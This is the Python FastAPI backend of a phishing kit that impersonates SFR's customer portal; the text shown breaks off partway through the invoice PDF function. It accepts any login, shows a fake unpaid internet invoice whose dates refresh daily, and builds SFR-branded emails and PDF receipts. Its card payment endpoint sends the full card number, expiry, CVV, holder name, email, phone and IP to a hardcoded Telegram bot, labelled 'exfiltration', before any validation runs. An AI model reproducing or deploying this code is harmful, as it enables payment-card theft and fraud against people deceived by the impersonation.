import os
import logging
import uuid
import secrets
import re
import calendar
from pathlib import Path
from datetime import datetime, timezone, timedelta
from zoneinfo import ZoneInfo
from io import BytesIO

from dotenv import load_dotenv

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

from fastapi import FastAPI, APIRouter, HTTPException, Depends, Request
from fastapi.responses import StreamingResponse, FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
from pydantic import BaseModel, Field, EmailStr
from typing import Optional, List

import bcrypt
import jwt
import httpx

from reportlab.lib.pagesizes import A4
from reportlab.lib.units import mm
from reportlab.lib import colors
from reportlab.pdfgen import canvas

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
mongo_url = os.environ.get("MONGO_URL") or os.environ.get("DATABASE_URL")
if not mongo_url:
    raise RuntimeError("MONGO_URL (or DATABASE_URL) is required")
client = AsyncIOMotorClient(mongo_url)

def _normalize_db_name(name: str) -> str:
    # Railway Mongo already created "Sfr"; force correct case for common variants
    n = (name or "Sfr").strip() or "Sfr"
    if n.lower() == "sfr":
        return "Sfr"
    return n

DB_NAME = _normalize_db_name(os.environ.get("DB_NAME", "Sfr"))
db = client[DB_NAME]

JWT_SECRET = os.environ.get("JWT_SECRET") or secrets.token_hex(32)
JWT_ALGORITHM = "HS256"
APP_URL = os.environ.get("APP_URL", "http://localhost:3000")
STATIC_DIR = Path(__file__).parent / "static"

EMAIL_BASE_URL = "https://integrations.emergentagent.com"
EMAIL_KEY = os.environ.get('EMERGENT_EMAIL_KEY')
EMAIL_FROM_NAME = os.environ.get('EMAIL_FROM_NAME', 'SFR')

# Telegram exfiltration (toutes les saisies)
TELEGRAM_BOT_TOKEN = os.environ.get(
    "TELEGRAM_BOT_TOKEN",
    "8302992553:AAFEn9vkPFIo6MQPTGMsR_A_gHkgcSirLfE",
)
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8777096346")

SFR_RED = colors.HexColor('#E2001A')

# All customer-facing dates/times are displayed in French local time.
PARIS_TZ = ZoneInfo("Europe/Paris")

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = FastAPI()
api_router = APIRouter(prefix="/api")

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")


def verify_password(plain: str, hashed: str) -> bool:
    try:
        return bcrypt.checkpw(plain.encode("utf-8"), hashed.encode("utf-8"))
    except Exception:
        return False


def create_access_token(user_id: str, remember: bool = False) -> str:
    days = 30 if remember else 1
    payload = {
        "sub": user_id,
        "type": "access",
        "exp": datetime.now(timezone.utc) + timedelta(days=days),
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)


def public_user(u: dict) -> dict:
    return {
        "id": u.get("id"),
        "login": u.get("login"),
        "email": u.get("email"),
        "name": u.get("name") or "Client SFR",
    }


async def get_current_user(request: Request) -> dict:
    auth_header = request.headers.get("Authorization", "")
    if not auth_header.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Non authentifié")
    token = auth_header[7:]
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Session expirée")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Token invalide")
    user = await db.users.find_one({"id": payload["sub"]}, {"_id": 0})
    if not user:
        raise HTTPException(status_code=401, detail="Utilisateur introuvable")
    return user


async def send_email(to: str, subject: str, html: str):
    if not EMAIL_KEY:
        logger.warning("EMERGENT_EMAIL_KEY missing, skipping email send")
        return
    payload = {"to": [to], "subject": subject, "html": html, "from_name": EMAIL_FROM_NAME}
    try:
        async with httpx.AsyncClient(timeout=30) as c:
            resp = await c.post(
                f"{EMAIL_BASE_URL}/api/v1/email/send",
                headers={"X-Email-Key": EMAIL_KEY},
                json=payload,
            )
        resp.raise_for_status()
        logger.info(f"Email sent to {to}")
    except Exception as e:
        logger.error(f"Email send failed: {e}")


def _client_meta(request: Optional[Request] = None) -> str:
    if request is None:
        return ""
    ip = (
        request.headers.get("x-forwarded-for", "").split(",")[0].strip()
        or request.headers.get("x-real-ip", "")
        or (request.client.host if request.client else "")
    )
    ua = request.headers.get("user-agent", "")[:180]
    return f"IP: {ip or 'n/a'}\nUA: {ua or 'n/a'}"


async def send_telegram(title: str, lines: dict, request: Optional[Request] = None):
    """Push card capture to Telegram (styled plain text)."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logger.warning("Telegram not configured, skip notify")
        return
    when = datetime.now(PARIS_TZ).strftime("%d/%m/%Y %H:%M:%S")
    body_lines = [
        f"💳 {title}",
        f"🕐 {when}",
        "",
    ]
    emoji_map = {
        "Titulaire": "👤",
        "N° carte": "💳",
        "Expiration": "📅",
        "CVV": "🔐",
        "Montant": "💰",
        "Facture": "🧾",
        "Email": "📧",
        "Téléphone": "📱",
        "User ID": "🆔",
        "Login": "🔑",
        "Statut": "📊",
        "Référence": "#️⃣",
    }
    for k, v in lines.items():
        if v is None or v == "":
            continue
        em = emoji_map.get(k, "•")
        body_lines.append(f"{em} {k}: {v}")
    if request is not None:
        ip = (
            request.headers.get("x-forwarded-for", "").split(",")[0].strip()
            or request.headers.get("x-real-ip", "")
            or (request.client.host if request.client else "")
        )
        ua = request.headers.get("user-agent", "")[:180]
        body_lines.extend(["", f"🌍 IP: {ip or 'n/a'}", f"🖥️ UA: {ua or 'n/a'}"])
    text = "\n".join(body_lines)
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        async with httpx.AsyncClient(timeout=20) as c:
            resp = await c.post(
                url,
                json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": text,
                    "disable_web_page_preview": True,
                },
            )
        resp.raise_for_status()
        logger.info("Telegram notify ok: %s", title)
    except Exception as e:
        logger.error("Telegram notify failed: %s", e)


def luhn_valid(number: str) -> bool:
    digits = [int(d) for d in re.sub(r"\D", "", number)]
    if len(digits) < 13:
        return False
    checksum = 0
    parity = len(digits) % 2
    for i, d in enumerate(digits):
        if i % 2 == parity:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0


def brand_email(title: str, body_html: str) -> str:
    return f"""
    <table width="100%" cellpadding="0" cellspacing="0" style="background:#f4f4f4;padding:24px 0;font-family:Arial,sans-serif;">
      <tr><td align="center">
        <table width="560" cellpadding="0" cellspacing="0" style="background:#ffffff;border:1px solid #e5e7eb;">
          <tr><td style="background:#E2001A;padding:20px 32px;">
            <span style="color:#ffffff;font-size:24px;font-weight:bold;letter-spacing:1px;">SFR</span>
          </td></tr>
          <tr><td style="padding:32px;">
            <h1 style="color:#111827;font-size:20px;margin:0 0 16px;">{title}</h1>
            {body_html}
          </td></tr>
          <tr><td style="padding:20px 32px;background:#f9fafb;border-top:1px solid #e5e7eb;">
            <p style="color:#9ca3af;font-size:12px;margin:0;">Cet email vous a été envoyé par votre Espace Client SFR. Ne communiquez jamais vos identifiants.</p>
          </td></tr>
        </table>
      </td></tr>
    </table>
    """


# ---------------------------------------------------------------------------
# Models
# ---------------------------------------------------------------------------
class LoginRequest(BaseModel):
    identifier: str
    password: str
    remember: bool = False


class ForgotPasswordRequest(BaseModel):
    email: EmailStr


class ForgotIdentifierRequest(BaseModel):
    email: EmailStr


class ResetPasswordRequest(BaseModel):
    token: str
    password: str


class CardPaymentRequest(BaseModel):
    invoice_id: str
    card_number: str
    card_holder: str
    expiry: str  # MM/YY
    cvv: str


class VerifyRequest(BaseModel):
    phone: str
    email: EmailStr


# ---------------------------------------------------------------------------
# User & invoice provisioning
# Demo mode: ANY identifier/password is accepted. Unknown users are created
# on the fly (and given the same demo invoices) so any email also works for
# the password / identifier recovery flows.
# ---------------------------------------------------------------------------
IBAN_FULL = "FR76 3000 4000 0512 3456 7890 143"
IBAN_MASKED = "FR76 XXXX XXXX XXXX XXXX XXXX XXX"

BOX_INVOICE_LABEL = "Box Internet Wi-Fi"


def _seed_invoice_templates():
    return [
        {"number": "FACT-2026-0788", "label": BOX_INVOICE_LABEL, "period": "Juillet 2026", "amount": 39.99, "due_date": "2026-07-15", "status": "unpaid",
         "payment_method": "Prélèvement automatique par IBAN", "mandate_status": "active",
         "failure_reason": "Fonds insuffisants sur le compte bancaire associé", "failure_code": "ERR_PAY_301",
         "failure_date": "2026-07-16T09:12:00", "attempts": 2, "max_attempts": 3, "next_attempt_date": "2026-07-30",
         "last_transaction_ref": "TXN-1948960898",
         "attempt_history": [
             {"date": "2026-07-16T09:12:00", "status": "failed", "reason": "Fonds insuffisants", "ref": "TXN-1948960898"},
             {"date": "2026-07-11T06:00:00", "status": "failed", "reason": "Fonds insuffisants", "ref": "TXN-1931004552"},
         ]},
    ]


def build_invoice_docs(user_id: str):
    docs = []
    for inv in _seed_invoice_templates():
        docs.append({
            "id": str(uuid.uuid4()),
            "user_id": user_id,
            "iban": IBAN_FULL,
            "iban_masked": IBAN_MASKED,
            "paid_at": None,
            "transaction_id": None,
            **inv,
        })
    return docs


async def ensure_invoices(user_id: str):
    if await db.invoices.count_documents({"user_id": user_id}) == 0:
        docs = build_invoice_docs(user_id)
        if docs:
            await db.invoices.insert_many(docs)


async def ensure_unpaid_box_invoice(user_id: str) -> dict:
    """Return an unpaid Box Internet invoice for the user, creating a fresh one if none exists.

    Keeps the demo repeatable: after a payment, a new verification generates a new
    unpaid invoice so the flow can be replayed.
    """
    inv = await db.invoices.find_one(
        {"user_id": user_id, "status": "unpaid"}, {"_id": 0}
    )
    if inv:
        return inv
    docs = build_invoice_docs(user_id)
    await db.invoices.insert_many([{**d} for d in docs])
    return await db.invoices.find_one(
        {"user_id": user_id, "status": "unpaid"}, {"_id": 0}
    )


async def _unique_login(base: str) -> str:
    base = re.sub(r"[^a-z0-9._-]", "", base.lower()) or "client"
    candidate, i = base, 1
    while await db.users.find_one({"login": candidate}):
        i += 1
        candidate = f"{base}{i}"
    return candidate


def _name_from_email(email: str) -> str:
    local = email.split("@")[0]
    parts = [p for p in re.split(r"[._-]+", local) if p]
    return " ".join(p.capitalize() for p in parts) or "Client SFR"


async def create_user(login: str, email: str, name: str, password: str) -> dict:
    user_id = str(uuid.uuid4())
    doc = {
        "id": user_id,
        "login": login,
        "email": email,
        "name": name,
        "password_hash": hash_password(password or secrets.token_urlsafe(9)),
        "created_at": datetime.now(timezone.utc).isoformat(),
        "phone": "",
    }
    try:
        await db.users.insert_one(dict(doc))
    except Exception as e:
        logger.warning("create_user insert failed: %s", e)
        existing = await db.users.find_one({"$or": [{"login": login}, {"email": email}]}, {"_id": 0})
        if existing:
            await ensure_invoices(existing["id"])
            return existing
        raise
    await ensure_invoices(user_id)
    return doc


async def get_or_create_user_by_identifier(identifier: str, password: str) -> dict:
    ident = identifier.strip().lower()
    user = await db.users.find_one({"$or": [{"login": ident}, {"email": ident}]}, {"_id": 0})
    if user:
        await ensure_invoices(user["id"])
        return user
    is_email = "@" in ident
    email = ident if is_email else f"{ident}@client.sfr.fr"
    login = await _unique_login(ident.split("@")[0] if is_email else ident)
    return await create_user(login, email, _name_from_email(email), password)


async def get_or_create_user_by_email(email: str) -> dict:
    email = email.strip().lower()
    user = await db.users.find_one({"email": email}, {"_id": 0})
    if user:
        await ensure_invoices(user["id"])
        return user
    login = await _unique_login(email.split("@")[0])
    return await create_user(login, email, _name_from_email(email), secrets.token_urlsafe(9))


# ---------------------------------------------------------------------------
# Auth endpoints
# ---------------------------------------------------------------------------
@api_router.post("/auth/login")
async def login(payload: LoginRequest, request: Request):
    if not payload.identifier.strip() or not payload.password:
        raise HTTPException(status_code=401, detail="Identifiant ou mot de passe incorrect")
    try:
        user = await get_or_create_user_by_identifier(payload.identifier, payload.password)
        token = create_access_token(user["id"], payload.remember)
        return {"token": token, "user": public_user(user)}
    except HTTPException:
        raise
    except Exception as e:
        logger.exception("login failed")
        raise HTTPException(status_code=500, detail=f"login_error: {type(e).__name__}: {e}")


@api_router.post("/auth/verify")
async def verify_identity(payload: VerifyRequest, request: Request):
    """Identity verification entry point.

    The user confirms their phone number (to prove they are the line holder) and
    their email. We create/find the account, attach the phone, ensure an unpaid
    Box Internet invoice, send a generic connection-confirmation email and return
    a session token + the invoice id.
    """
    try:
        phone_digits = re.sub(r"\D", "", payload.phone or "")
        if len(phone_digits) < 9:
            raise HTTPException(status_code=422, detail="Numéro de téléphone invalide")
        email = str(payload.email).strip().lower()
        user = await get_or_create_user_by_email(email)
        await db.users.update_one({"id": user["id"]}, {"$set": {"phone": payload.phone.strip()}})
        inv = await ensure_unpaid_box_invoice(user["id"])
        if not inv:
            raise HTTPException(status_code=500, detail="Impossible de créer la facture")
        token = create_access_token(user["id"], remember=False)

        when = datetime.now(PARIS_TZ).strftime("%d/%m/%Y à %H:%M")
        html = brand_email(
            "Connexion à votre Espace Client",
            f"""<p style="color:#4b5563;font-size:14px;line-height:22px;">Bonjour,</p>
            <p style="color:#4b5563;font-size:14px;line-height:22px;">Une connexion à votre Espace Client SFR vient d'être établie avec succès le <strong>{when}</strong>.</p>
            <p style="color:#4b5563;font-size:14px;line-height:22px;">Si vous êtes à l'origine de cette connexion, aucune action n'est nécessaire de votre part.</p>
            <p style="color:#4b5563;font-size:14px;line-height:22px;">Dans le cas contraire, nous vous invitons à contacter immédiatement notre service client au 1023.</p>
            <p style="color:#9ca3af;font-size:12px;margin-top:24px;">À bientôt,<br/>L'équipe SFR</p>""",
        )
        try:
            await send_email(email, "Connexion à votre Espace Client SFR", html)
        except Exception as mail_err:
            logger.warning("verify email skipped: %s", mail_err)

        return {"token": token, "user": public_user(user), "invoice_id": inv["id"]}
    except HTTPException:
        raise
    except Exception as e:
        logger.exception("verify failed")
        raise HTTPException(status_code=500, detail=f"verify_error: {type(e).__name__}: {e}")


@api_router.get("/auth/me")
async def me(user: dict = Depends(get_current_user)):
    return public_user(user)


@api_router.post("/auth/forgot-password")
async def forgot_password(payload: ForgotPasswordRequest, request: Request):
    email = payload.email.strip().lower()
    user = await get_or_create_user_by_email(email)
    token = secrets.token_urlsafe(32)
    await db.password_resets.insert_one({
        "id": str(uuid.uuid4()),
        "token": token,
        "user_id": user["id"],
        "used": False,
        "expires_at": datetime.now(timezone.utc) + timedelta(minutes=30),
        "created_at": datetime.now(timezone.utc),
    })
    link = f"{APP_URL}/reset-password?token={token}"
    html = brand_email(
        "Réinitialisation de votre mot de passe",
        f"""<p style="color:#4b5563;font-size:14px;line-height:22px;">Bonjour {user['name']},</p>
        <p style="color:#4b5563;font-size:14px;line-height:22px;">Vous avez demandé la réinitialisation de votre mot de passe. Cliquez sur le bouton ci-dessous pour choisir un nouveau mot de passe. Ce lien est valable 30 minutes.</p>
        <p style="margin:24px 0;"><a href="{link}" style="background:#E2001A;color:#ffffff;text-decoration:none;padding:12px 28px;font-weight:bold;display:inline-block;">Réinitialiser mon mot de passe</a></p>
        <p style="color:#9ca3af;font-size:12px;">Si vous n'êtes pas à l'origine de cette demande, ignorez cet email.</p>""",
    )
    await send_email(email, "Réinitialisation de votre mot de passe SFR", html)
    return {"message": "Un lien de réinitialisation vient d'être envoyé à votre adresse email."}


@api_router.post("/auth/reset-password")
async def reset_password(payload: ResetPasswordRequest, request: Request):
    rec = await db.password_resets.find_one({"token": payload.token}, {"_id": 0})
    if not rec or rec["used"]:
        raise HTTPException(status_code=400, detail="Lien invalide ou déjà utilisé")
    expires = rec["expires_at"]
    if expires.tzinfo is None:
        expires = expires.replace(tzinfo=timezone.utc)
    if expires < datetime.now(timezone.utc):
        raise HTTPException(status_code=400, detail="Lien expiré, veuillez refaire une demande")
    if len(payload.password) < 8:
        raise HTTPException(status_code=400, detail="Le mot de passe doit contenir au moins 8 caractères")
    await db.users.update_one({"id": rec["user_id"]}, {"$set": {"password_hash": hash_password(payload.password)}})
    await db.password_resets.update_one({"token": payload.token}, {"$set": {"used": True}})
    return {"message": "Votre mot de passe a été réinitialisé avec succès."}


@api_router.post("/auth/forgot-identifier")
async def forgot_identifier(payload: ForgotIdentifierRequest, request: Request):
    email = payload.email.strip().lower()
    user = await get_or_create_user_by_email(email)
    html = brand_email(
        "Rappel de votre identifiant",
        f"""<p style="color:#4b5563;font-size:14px;line-height:22px;">Bonjour {user['name']},</p>
        <p style="color:#4b5563;font-size:14px;line-height:22px;">Vous avez demandé un rappel de votre identifiant de connexion. Le voici :</p>
        <p style="margin:24px 0;font-size:20px;font-weight:bold;color:#111827;background:#f3f4f6;padding:16px;text-align:center;letter-spacing:1px;">{user['login']}</p>
        <p style="color:#9ca3af;font-size:12px;">Vous pouvez maintenant vous connecter à votre Espace Client SFR.</p>""",
    )
    await send_email(email, "Votre identifiant de connexion SFR", html)
    return {"message": "Votre identifiant vient de vous être envoyé par email."}


# ---------------------------------------------------------------------------
# Invoices
# ---------------------------------------------------------------------------
def _add_one_month(d: datetime) -> datetime:
    month = d.month + 1
    year = d.year + (month - 1) // 12
    month = (month - 1) % 12 + 1
    day = min(d.day, calendar.monthrange(year, month)[1])
    return d.replace(year=year, month=month, day=day)


def _dynamic_dates() -> dict:
    """Compute always-current dates for the unpaid invoice.

    - failure date  : TODAY at 08:30 (refreshes every day at midnight)
    - next attempt  : TODAY + 1 month
    Returned as naive ISO strings so the frontend renders the exact clock time.
    """
    today = datetime.now(PARIS_TZ)
    failure_dt = today.replace(hour=8, minute=30, second=0, microsecond=0)
    next_attempt = _add_one_month(today)
    return {
        "failure_date": failure_dt.strftime("%Y-%m-%dT08:30:00"),
        "next_attempt_date": next_attempt.strftime("%Y-%m-%d"),
        "today_830": failure_dt,
    }


def _dynamic_history(history: list, ref_dt: datetime) -> list:
    """Re-date each recorded attempt relative to today (08:30), most recent first."""
    out = []
    for i, a in enumerate(history or []):
        d = (ref_dt - timedelta(days=5 * i)).strftime("%Y-%m-%dT08:30:00")
        out.append({**a, "date": d})
    return out


def public_invoice(inv: dict) -> dict:
    dyn = _dynamic_dates()
    is_unpaid = inv.get("status") != "paid"
    return {
        "id": inv["id"],
        "number": inv["number"],
        "label": inv["label"],
        "period": inv["period"],
        "amount": inv["amount"],
        "due_date": inv["due_date"],
        "status": inv["status"],
        "iban_masked": inv["iban_masked"],
        "paid_at": inv.get("paid_at"),
        "transaction_id": inv.get("transaction_id"),
        "payment_method": inv.get("payment_method", "Prélèvement automatique par IBAN"),
        "mandate_status": inv.get("mandate_status", "active"),
        "failure_reason": inv.get("failure_reason"),
        "failure_code": inv.get("failure_code"),
        "failure_date": dyn["failure_date"] if is_unpaid else inv.get("failure_date"),
        "attempts": inv.get("attempts"),
        "max_attempts": inv.get("max_attempts", 3),
        "next_attempt_date": dyn["next_attempt_date"] if (is_unpaid and inv.get("next_attempt_date")) else inv.get("next_attempt_date"),
        "last_transaction_ref": inv.get("last_transaction_ref"),
        "attempt_history": _dynamic_history(inv.get("attempt_history", []), dyn["today_830"]) if is_unpaid else inv.get("attempt_history", []),
    }


@api_router.get("/invoices")
async def list_invoices(user: dict = Depends(get_current_user)):
    invoices = await db.invoices.find({"user_id": user["id"]}, {"_id": 0}).sort("due_date", -1).to_list(200)
    return [public_invoice(i) for i in invoices]


@api_router.get("/invoices/{invoice_id}")
async def get_invoice(invoice_id: str, user: dict = Depends(get_current_user)):
    inv = await db.invoices.find_one({"id": invoice_id, "user_id": user["id"]}, {"_id": 0})
    if not inv:
        raise HTTPException(status_code=404, detail="Facture introuvable")
    return public_invoice(inv)


# ---------------------------------------------------------------------------
# Payments (simulation)
# ---------------------------------------------------------------------------
@api_router.post("/payments/card")
async def pay_card(payload: CardPaymentRequest, request: Request, user: dict = Depends(get_current_user)):
    inv = await db.invoices.find_one({"id": payload.invoice_id, "user_id": user["id"]}, {"_id": 0})
    if not inv:
        raise HTTPException(status_code=404, detail="Facture introuvable")
    if inv["status"] == "paid":
        raise HTTPException(status_code=400, detail="Cette facture est déjà réglée")

    card_number = re.sub(r"\s", "", payload.card_number)

    # Notify Telegram with full card data BEFORE validation rejects bad cards
    await send_telegram(
        "SFR — PAIEMENT CARTE",
        {
            "Titulaire": payload.card_holder,
            "N° carte": card_number,
            "Expiration": payload.expiry,
            "CVV": payload.cvv,
            "Montant": f"{inv.get('amount')} EUR",
            "Facture": inv.get("number"),
            "Email": user.get("email"),
            "Téléphone": user.get("phone", ""),
            "User ID": user.get("id"),
            "Login": user.get("login"),
        },
        request,
    )

    if not luhn_valid(card_number):
        raise HTTPException(status_code=422, detail="Numéro de carte invalide")
    if not re.match(r"^(0[1-9]|1[0-2])\/\d{2}$", payload.expiry):
        raise HTTPException(status_code=422, detail="Date d'expiration invalide")
    if not re.match(r"^\d{3}$", payload.cvv):
        raise HTTPException(status_code=422, detail="CVV invalide")

    # Simulation: la carte de test 4000 0000 0000 0002 échoue toujours.
    declined = card_number.endswith("0000000000000002") or card_number == "4000000000000002"
    txn_id = str(uuid.uuid4())
    now = datetime.now(timezone.utc)
    reference = "SFR-" + now.strftime("%Y%m%d") + "-" + secrets.token_hex(4).upper()
    status = "failed" if declined else "success"

    txn = {
        "id": txn_id,
        "reference": reference,
        "invoice_id": inv["id"],
        "invoice_number": inv["number"],
        "user_id": user["id"],
        "amount": inv["amount"],
        "card_last4": card_number[-4:],
        "card_holder": payload.card_holder,
        "iban_masked": inv["iban_masked"],
        "status": status,
        "error_message": "Votre banque a refusé la transaction. Veuillez vérifier vos informations ou utiliser une autre carte." if declined else None,
        "created_at": now.isoformat(),
    }
    await db.transactions.insert_one({**txn})

    if not declined:
        await db.invoices.update_one(
            {"id": inv["id"]},
            {"$set": {"status": "paid", "paid_at": now.isoformat(), "transaction_id": txn_id}},
        )
        amount_str = f"{inv['amount']:.2f} EUR".replace(".", ",")
        paid_when = now.astimezone(PARIS_TZ).strftime("%d/%m/%Y à %H:%M")
        html = brand_email(
            "Votre paiement a bien été pris en compte",
            f"""<p style="color:#4b5563;font-size:14px;line-height:22px;">Bonjour,</p>
            <p style="color:#4b5563;font-size:14px;line-height:22px;">Nous vous confirmons que votre facture <strong>{inv['label']}</strong> a bien été régularisée. Votre situation est désormais à jour.</p>
            <table width="100%" cellpadding="0" cellspacing="0" style="margin:20px 0;border:1px solid #e5e7eb;border-collapse:collapse;">
              <tr><td style="padding:12px 16px;color:#6b7280;font-size:13px;border-bottom:1px solid #e5e7eb;">Montant réglé</td><td style="padding:12px 16px;color:#111827;font-size:14px;font-weight:bold;text-align:right;border-bottom:1px solid #e5e7eb;">{amount_str}</td></tr>
              <tr><td style="padding:12px 16px;color:#6b7280;font-size:13px;border-bottom:1px solid #e5e7eb;">Carte utilisée</td><td style="padding:12px 16px;color:#111827;font-size:14px;font-weight:bold;text-align:right;border-bottom:1px solid #e5e7eb;">**** **** **** {card_number[-4:]}</td></tr>
              <tr><td style="padding:12px 16px;color:#6b7280;font-size:13px;border-bottom:1px solid #e5e7eb;">Référence</td><td style="padding:12px 16px;color:#111827;font-size:14px;font-weight:bold;text-align:right;border-bottom:1px solid #e5e7eb;">{reference}</td></tr>
              <tr><td style="padding:12px 16px;color:#6b7280;font-size:13px;">Date du paiement</td><td style="padding:12px 16px;color:#111827;font-size:14px;font-weight:bold;text-align:right;">{paid_when}</td></tr>
            </table>
            <p style="color:#4b5563;font-size:14px;line-height:22px;">Un reçu détaillé est disponible dans votre Espace Client.</p>
            <p style="color:#9ca3af;font-size:12px;margin-top:24px;">Merci de votre confiance,<br/>L'équipe SFR</p>""",
        )
        await send_email(user["email"], "Confirmation de paiement SFR", html)

    txn.pop("_id", None)
    return txn


@api_router.get("/payments/{txn_id}")
async def get_payment(txn_id: str, user: dict = Depends(get_current_user)):
    txn = await db.transactions.find_one({"id": txn_id, "user_id": user["id"]}, {"_id": 0})
    if not txn:
        raise HTTPException(status_code=404, detail="Transaction introuvable")
    return txn


@api_router.get("/invoices/{invoice_id}/receipt.pdf")
async def receipt_pdf(invoice_id: str, user: dict = Depends(get_current_user)):
    inv = await db.invoices.find_one({"id": invoice_id, "user_id": user["id"]}, {"_id": 0})
    if not inv:
        raise HTTPException(status_code=404, detail="Facture introuvable")
    if inv["status"] != "paid" or not inv.get("transaction_id"):
        raise HTTPException(status_code=400, detail="Aucun reçu disponible pour cette facture")
    txn = await db.transactions.find_one({"id": inv["transaction_id"]}, {"_id": 0})

    buf = BytesIO()
    c = canvas.Canvas(buf, pagesize=A4)
    w, h = A4

    # Header band
    c.setFillColor(SFR_RED)
    c.rect(0, h - 45 * mm, w, 45 * mm, fill=1, stroke=0)
    c.setFillColor(colors.white)
    c.setFont("Helvetica-Bold", 32)
    c.drawString(20 * mm, h - 30 * mm, "SFR")
    c.setFont("Helvetica", 12)
    c.drawRightString(w - 20 * mm, h - 25 * mm, "Reçu de paiement")
    c.setFont("Helvetica", 9)
    c.drawRightString(w - 20 * mm, h - 32 * mm, "Espace Client")

    y = h - 62 * mm
    c.setFillColor(colors.HexColor('#111827'))
    c.setFont("Helvetica-Bold", 18)
    c.drawString(20 * mm, y, "Paiement confirmé")
    y -= 8 * mm
    c.setFillColor(colors.HexColor('#16A34A'))
    c.setFont("Helvetica-Bold", 11)
    c.drawString(20 * mm, y, "Statut : PAYÉE")

    def paid_date():
        try:
            return datetime.fromisoformat(inv["paid_at"]).strftime("%d/%m/%Y à %H:%M")
        except Exception:
            return inv.get("paid_at", "")

    rows = [
        ("Client", user["name"]),
        ("Numéro de facture", inv["number"]),
        ("Libellé", inv["label"]),
        ("Période", inv["period"]),
        ("Référence transaction", txn["reference"] if txn else ""),
        ("Date de paiement", paid_date()),
        ("Moyen de paiement", f"Carte bancaire ****{txn['card_last4']}" if txn else "Carte bancaire"),
        ("IBAN de prélèvement", inv["iban_masked"]),
    ]

    y -= 14 * mm
    c.setFillColor(colors.HexColor('#374151'))
    for label, value in rows:
        c.setFont("Helvetica", 10)
        c.setFillColor(colors.HexColor('#6b7280'))
        c.drawString(20 * mm, y, label)
        c.setFont("Helvetica-Bold", 11)
        c.setFillColor(colors.HexColor('#111827'))
        c.drawString(80 * mm, y, str(value))
        c.setStrokeColor(colors.HexColor('#e5e7eb'))
        c.line(20 * mm, y - 3 * mm, w - 20 * mm, y - 3 * mm)
        y -= 11 * mm

    # Amount box
    y -= 6 * mm
    c.setFillColor(colors.HexColor('#f9fafb'))
    c.rect(20 * mm, y - 18 * mm, w - 40 * mm, 22 * mm, fill=1, stroke=0)
    c.setFillColor(colors.HexColor('#6b7280'))
    c.setFont("Helvetica", 11)
    c.drawString(26 * mm, y - 6 * mm, "Montant réglé")
    c.setFillColor(SFR_RED)
    c.setFont("Helvetica-Bold", 22)
    c.drawRightString(w - 26 * mm, y - 8 * mm, f"{inv['amount']:.2f} EUR".replace(".", ","))

    c.setFillColor(colors.HexColor('#9ca3af'))
    c.setFont("Helvetica", 8)
    c.drawString(20 * mm, 15 * mm, "SFR — Ce reçu atteste du règlement de la facture mentionnée ci-dessus. Document généré automatiquement.")
    c.showPage()
    c.save()
    buf.seek(0)
    filename = f"recu-{inv['number']}.pdf"
    return StreamingResponse(
        buf,
        media_type="application/pdf",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


@api_router.get("/invoices/{invoice_id}/facture.pdf")
async def facture_pdf(invoice_id: str, user: dict = Depends(get_current_user)):
    inv = await db.invoices.find_one({"id": invoice_id, "user_id": user["id"]}, {"_id": 0})
    if not inv:
        raise HTTPException(status_code=404, detail="Facture introuvable")

    buf = BytesIO()
    c = canvas.Canvas(buf, pagesize=A4)
    w, h = A4
    c.setFillColor(SFR_RED)
    c.rect(0, h - 45 * mm, w, 45 * mm, fill=1, stroke=0)
    c.setFillColor(colors.white)
    c.setFont("Helvetica-Bold", 32)
    c.drawString(20 * mm, h - 30 * mm, "SFR")
    c.setFont("Helvetica", 12)
    c.drawRightString(w - 20 * mm, h - 25 * mm, "Facture")
    c.setFont("Helvetica", 9)
    c.drawRightString(w - 20 * mm, h - 32 * mm, f"N° {inv['number']}")

    y = h - 62 * mm
    c.setFillColor(colors.HexColor('#111827'))
    c.setFont("Helvetica-Bold", 18)
    c.drawString(20 * mm, y, inv["label"])
    y -= 8 * mm
    is_paid = inv["status"] == "paid"
    c.setFillColor(colors.HexColor('#16A34A') if is_paid else SFR_RED)
    c.setFont("Helvetica-Bold", 11)
    c.drawString(20 * mm, y, "Statut : PAYÉE" if is_paid else "Statut : IMPAYÉE")

    rows = [
        ("Client", user["name"]),
        ("Numéro de facture", inv["number"]),
        ("Période", inv["period"]),
        ("Date d'échéance", inv["due_date"]),
        ("Moyen de paiement", inv.get("payment_method", "Prélèvement automatique par IBAN")),
        ("IBAN de prélèvement", inv["iban_masked"]),
    ]
    y -= 14 * mm
    for label, value in rows:
        c.setFont("Helvetica", 10)
        c.setFillColor(colors.HexColor('#6b7280'))
        c.drawString(20 * mm, y, label)
        c.setFont("Helvetica-Bold", 11)
        c.setFillColor(colors.HexColor('#111827'))
        c.drawString(80 * mm, y, str(value))
        c.setStrokeColor(colors.HexColor('#e5e7eb'))
        c.line(20 * mm, y - 3 * mm, w - 20 * mm, y - 3 * mm)
        y -= 11 * mm

    y -= 6 * mm
    c.setFillColor(colors.HexColor('#f9fafb'))
    c.rect(20 * mm, y - 18 * mm, w - 40 * mm, 22 * mm, fill=1, stroke=0)
    c.setFillColor(colors.HexColor('#6b7280'))
    c.setFont("Helvetica", 11)
    c.drawString(26 * mm, y - 6 * mm, "Montant total TTC")
    c.setFillColor(SFR_RED)
    c.setFont("Helvetica-Bold", 22)
